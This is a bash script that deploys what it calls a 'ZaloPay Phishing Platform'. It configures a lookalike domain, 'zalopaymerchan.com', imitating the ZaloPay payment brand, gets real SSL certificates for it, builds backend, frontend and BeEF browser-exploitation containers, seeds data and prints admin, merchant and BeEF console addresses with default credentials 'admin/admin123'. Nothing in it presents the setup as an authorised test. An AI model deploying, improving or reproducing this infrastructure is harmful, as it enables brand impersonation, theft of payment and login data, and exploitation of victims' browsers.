#!/bin/bash

# ZaloPay Phishing Platform Deployment Script
# This script handles the complete deployment of the platform

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DOMAIN="zalopaymerchan.com"
PROJECT_NAME="zalopay_phishing"
ENV_FILE=".env"
DOCKER_COMPOSE_FILE="docker-compose.yml"

# Logging
LOG_FILE="deployment.log"
exec > >(tee -a $LOG_FILE)
exec 2>&1

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_requirements() {
    log_info "Checking system requirements..."
    
    # Check if Docker is installed
    if ! command -v docker &> /dev/null; then
        log_error "Docker is not installed. Please install Docker first."
        exit 1
    fi
    
    # Check if Docker Compose is installed
    if ! command -v docker-compose &> /dev/null; then
        log_error "Docker Compose is not installed. Please install Docker Compose first."
        exit 1
    fi
    
    # Check if domain is accessible
    if ! ping -c 1 $DOMAIN &> /dev/null; then
        log_warning "Domain $DOMAIN is not accessible. Please ensure DNS is configured correctly."
    fi
    
    log_success "System requirements check completed"
}

setup_environment() {
    log_info "Setting up environment..."
    
    # Check if .env file exists
    if [ ! -f "$ENV_FILE" ]; then
        log_info "Creating .env file from template..."
        cp env.production.template $ENV_FILE
        
        # Update domain in .env file
        sed -i "s/DOMAIN=.*/DOMAIN=$DOMAIN/" $ENV_FILE
        sed -i "s/BACKEND_URL=.*/BACKEND_URL=https:\/\/$DOMAIN/" $ENV_FILE
        sed -i "s/FRONTEND_URL=.*/FRONTEND_URL=https:\/\/$DOMAIN/" $ENV_FILE
        
        log_warning "Please update the .env file with your actual credentials before continuing."
        log_warning "Press Enter when you have updated the .env file..."
        read
    fi
    
    # Create necessary directories
    mkdir -p logs
    mkdir -p data/mongodb
    mkdir -p data/redis
    mkdir -p data/influxdb
    mkdir -p data/beef
    mkdir -p ssl
    
    log_success "Environment setup completed"
}

build_images() {
    log_info "Building Docker images..."
    
    # Build backend image
    log_info "Building backend image..."
    docker build -t ${PROJECT_NAME}_backend:latest ./backend/
    
    # Build frontend image
    log_info "Building frontend image..."
    docker build -t ${PROJECT_NAME}_frontend:latest ./frontend/
    
    # Build BeEF image
    log_info "Building BeEF image..."
    docker build -t ${PROJECT_NAME}_beef:latest ./beef/
    
    log_success "Docker images built successfully"
}

initialize_ssl() {
    log_info "Initializing SSL certificates..."
    
    # Make init-letsencrypt.sh executable
    chmod +x scripts/init-letsencrypt.sh
    
    # Run SSL initialization
    ./scripts/init-letsencrypt.sh
    
    log_success "SSL certificates initialized"
}

start_services() {
    log_info "Starting services..."
    
    # Start services with docker-compose
    docker-compose -f $DOCKER_COMPOSE_FILE up -d
    
    # Wait for services to be ready
    log_info "Waiting for services to be ready..."
    sleep 30
    
    # Check service health
    check_service_health
    
    log_success "Services started successfully"
}

check_service_health() {
    log_info "Checking service health..."
    
    # Check MongoDB
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh --eval "db.runCommand('ping')" &> /dev/null; then
        log_success "MongoDB is healthy"
    else
        log_error "MongoDB is not healthy"
    fi
    
    # Check Redis
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T redis redis-cli ping &> /dev/null; then
        log_success "Redis is healthy"
    else
        log_error "Redis is not healthy"
    fi
    
    # Check InfluxDB
    if curl -s http://localhost:8086/health &> /dev/null; then
        log_success "InfluxDB is healthy"
    else
        log_error "InfluxDB is not healthy"
    fi
    
    # Check Backend
    if curl -s http://localhost:8000/health &> /dev/null; then
        log_success "Backend is healthy"
    else
        log_error "Backend is not healthy"
    fi
    
    # Check Frontend
    if curl -s http://localhost:80 &> /dev/null; then
        log_success "Frontend is healthy"
    else
        log_error "Frontend is not healthy"
    fi
    
    # Check BeEF
    if curl -s http://localhost:3000 &> /dev/null; then
        log_success "BeEF is healthy"
    else
        log_error "BeEF is not healthy"
    fi
}

initialize_databases() {
    log_info "Initializing databases..."
    
    # Wait for MongoDB to be ready
    log_info "Waiting for MongoDB to be ready..."
    sleep 10
    
    # Initialize MongoDB collections
    log_info "Initializing MongoDB collections..."
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from database.mongodb.init_collections import initialize_collections
asyncio.run(initialize_collections())
"
    
    # Seed production data
    log_info "Seeding production data..."
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from database.mongodb.seed_production_data import seed_production_data
asyncio.run(seed_production_data())
"
    
    # Initialize InfluxDB
    log_info "Initializing InfluxDB..."
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T influxdb influx setup \
        --username admin \
        --password admin123 \
        --org zalopay \
        --bucket metrics \
        --force
    
    log_success "Databases initialized successfully"
}

setup_monitoring() {
    log_info "Setting up monitoring..."
    
    # Initialize InfluxDB client
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from monitoring.influxdb_client import initialize_influxdb
asyncio.run(initialize_influxdb('http://influxdb:8086', 'admin-token', 'zalopay', 'metrics'))
"
    
    # Start metrics collection
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from monitoring.metrics_collector import start_metrics_collection
asyncio.run(start_metrics_collection())
" &
    
    log_success "Monitoring setup completed"
}

setup_security() {
    log_info "Setting up security..."
    
    # Initialize rate limiters
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from security.rate_limiting import initialize_rate_limiters
asyncio.run(initialize_rate_limiters())
"
    
    # Initialize network security
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from security.network_segmentation import get_network_security_manager
asyncio.run(get_network_security_manager())
"
    
    # Initialize secrets management
    docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "
import asyncio
from security.secrets_management import get_secrets_manager
asyncio.run(get_secrets_manager())
"
    
    log_success "Security setup completed"
}

verify_deployment() {
    log_info "Verifying deployment..."
    
    # Check if all services are running
    if docker-compose -f $DOCKER_COMPOSE_FILE ps | grep -q "Up"; then
        log_success "All services are running"
    else
        log_error "Some services are not running"
        docker-compose -f $DOCKER_COMPOSE_FILE ps
        exit 1
    fi
    
    # Check SSL certificate
    if [ -f "ssl/live/$DOMAIN/fullchain.pem" ]; then
        log_success "SSL certificate is available"
    else
        log_warning "SSL certificate not found"
    fi
    
    # Check if domain is accessible
    if curl -s -I https://$DOMAIN | grep -q "200 OK"; then
        log_success "Domain is accessible via HTTPS"
    else
        log_warning "Domain is not accessible via HTTPS"
    fi
    
    log_success "Deployment verification completed"
}

show_deployment_info() {
    log_info "Deployment Information:"
    echo "=================================="
    echo "Domain: https://$DOMAIN"
    echo "Admin Dashboard: https://$DOMAIN/admin"
    echo "Merchant Interface: https://$DOMAIN/merchant"
    echo "BeEF Console: http://localhost:3000/ui/panel"
    echo "InfluxDB: http://localhost:8086"
    echo "MongoDB: mongodb://localhost:27017"
    echo "Redis: redis://localhost:6379"
    echo "=================================="
    echo ""
    echo "Default Admin Credentials:"
    echo "Username: admin"
    echo "Password: admin123"
    echo ""
    echo "Please change the default password after first login!"
    echo ""
    echo "Logs are available in: $LOG_FILE"
    echo "Service logs: docker-compose logs -f"
}

cleanup() {
    log_info "Cleaning up..."
    
    # Remove old containers
    docker-compose -f $DOCKER_COMPOSE_FILE down --remove-orphans
    
    # Remove old images
    docker image prune -f
    
    log_success "Cleanup completed"
}

# Main deployment function
deploy() {
    log_info "Starting ZaloPay Phishing Platform deployment..."
    echo "=================================="
    
    check_requirements
    setup_environment
    build_images
    initialize_ssl
    start_services
    initialize_databases
    setup_monitoring
    setup_security
    verify_deployment
    show_deployment_info
    
    log_success "Deployment completed successfully!"
    echo "=================================="
}

# Handle command line arguments
case "${1:-deploy}" in
    "deploy")
        deploy
        ;;
    "build")
        build_images
        ;;
    "start")
        start_services
        ;;
    "stop")
        docker-compose -f $DOCKER_COMPOSE_FILE down
        ;;
    "restart")
        docker-compose -f $DOCKER_COMPOSE_FILE restart
        ;;
    "logs")
        docker-compose -f $DOCKER_COMPOSE_FILE logs -f
        ;;
    "status")
        docker-compose -f $DOCKER_COMPOSE_FILE ps
        ;;
    "health")
        check_service_health
        ;;
    "cleanup")
        cleanup
        ;;
    "ssl")
        initialize_ssl
        ;;
    "db")
        initialize_databases
        ;;
    "monitoring")
        setup_monitoring
        ;;
    "security")
        setup_security
        ;;
    "verify")
        verify_deployment
        ;;
    *)
        echo "Usage: $0 {deploy|build|start|stop|restart|logs|status|health|cleanup|ssl|db|monitoring|security|verify}"
        echo ""
        echo "Commands:"
        echo "  deploy     - Complete deployment (default)"
        echo "  build      - Build Docker images only"
        echo "  start      - Start services only"
        echo "  stop       - Stop all services"
        echo "  restart    - Restart all services"
        echo "  logs       - Show service logs"
        echo "  status     - Show service status"
        echo "  health     - Check service health"
        echo "  cleanup    - Clean up old containers and images"
        echo "  ssl        - Initialize SSL certificates only"
        echo "  db         - Initialize databases only"
        echo "  monitoring - Setup monitoring only"
        echo "  security   - Setup security only"
        echo "  verify     - Verify deployment only"
        exit 1
        ;;
esac